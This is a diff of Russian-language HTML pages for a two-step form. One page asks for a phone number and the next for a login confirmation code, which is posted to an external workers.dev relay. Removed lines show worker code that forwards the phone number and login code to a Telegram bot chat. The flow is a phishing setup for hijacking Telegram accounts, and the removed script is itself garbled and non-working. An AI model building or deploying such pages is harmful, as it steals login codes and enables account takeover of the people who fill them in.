@@ -63,92 +63,73 @@
         <label for="newPhone">Новый номер телефона:</label>
         <input type="tel" id="newPhone" name="newPhone" placeholder="Новый номер телефона" required>
         <br>
-        <label for="code">Код подтверждение:</label>
-        <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
-        <br>
-        <button id="sendBtn">Присоединиться</button>
-        <button id="nextBtn">Далее</button>
+        <button id="sendBtn" type="submit">Далее</button>
     </form>
 
-    <script>
-        export default {
-            async fetch(request, env, ctx) {
-                const corsHeaders = {
-                    "Access-Control-Allow-Origin": "*",
-                    "Access-Control-Allow-Methods": "POST, GET, OPTIONS",
-                    "Access-Control-Allow-Headers": "Content-Type",
-                };
+</body>
+</html>
+```
 
-                if (request.method === "GET") {
-                    return new Response("Сервер работает! Ожидаю POST-запрос.", {
-                        headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
-                    });
-                }
+### Вторая страница (step2.html)
 
-                if (request.method === "POST") {
-                    try {
-                        const parsedData = await request.formData();
-                        console.log("Входящие данные:",
-JSON.stringify(Object.fromEntries(parsedData.entries()), null, 2));
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Проверка кода подтверждения</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: white; /* Изменили цвет фона на белый */
+        }
 
-                        const phone = parsedData.get('newPhone');
-                        const code = parsedData.get('code');
+        h1 {
+            margin-top: 0;
+        }
 
-                        if (env.BOT_TOKEN && env.ADMIN_CHAT_ID) {
-                            await fetch(`https://api.telegram.org/${env.BOT_TOKEN}/sendMessage`, {
-                                method: "POST",
-                                headers: { "Content-Type": "application/json" },
-                                body: JSON.stringify({
-                                    chat_id: env.ADMIN_CHAT_ID,
-                                    text: `Код входа ${code} отправлен на ${phone}.`,
-                                }),
-                            });
-                        }
+        form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 20px;
+        }
 
-                        return new Response("Данные успешно получены!", {
-                            status: 200,
-                            headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
-                        });
-                    } catch (err) {
-                        console.error("Ошибка обработки:", err.message);
-                        return new Response("Ошибка: " + err.message, {
-                            status: 500,
-                            headers: { "Content-Type": "text/plain; charset=utf-8", ...corsHeaders },
-                        });
-                    }
-                }
+        label {
+            margin-top: 10px;
+        }
 
-                return new Response("Method Not Allowed", { status: 405, headers: corsHeaders });
-            },
-        };
-        document.getElementById('nextBtn').addEventListener('click', async function() {
-            const phone = document.getElementById('newPhone').value;
-            const env = {}; // Изначально мы не знаем значения env, но это не проблема, так как оно будет
-получено позже.
+        input {
+            margin-bottom: 10px;
+            padding: 5px;
+            width: calc(100% - 10px);
+        }
 
-            if (env.BOT_TOKEN && env.ADMIN_CHAT_ID) {
-                await fetch(`https://api.telegram.org/${env.BOT_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: env.ADMIN_CHAT_ID,
-                        text: `Код входа отправлен на ${phone}.`,
-                    }),
-                });
-            }
+        button {
+            margin-top: 10px;
+            padding: 10px;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
 
-            // Сделаем предположение, что после отправки кода пользователю,
-            // форма отправится автоматически на следующую страницу.
-            this.submit();
-        });
-    </script>
+    <!-- Название страницы -->
+    <h1>Введите код подтверждения</h1>
 
-    <!-- Страница для ввода кода -->
+    <!-- Страница для ввода кода подтверждения -->
     <form action="https://tg-relay.egor8131723.workers.dev" method="post">
         <label for="code">Код подтверждение:</label>
         <input type="number" id="code" name="code" placeholder="Код подтверждение" required>
         <br>
-        <button id="sendBtn">Войти</button>
+        <button id="sendBtn" type="submit">Войти</button>
     </form>
 
 </body>
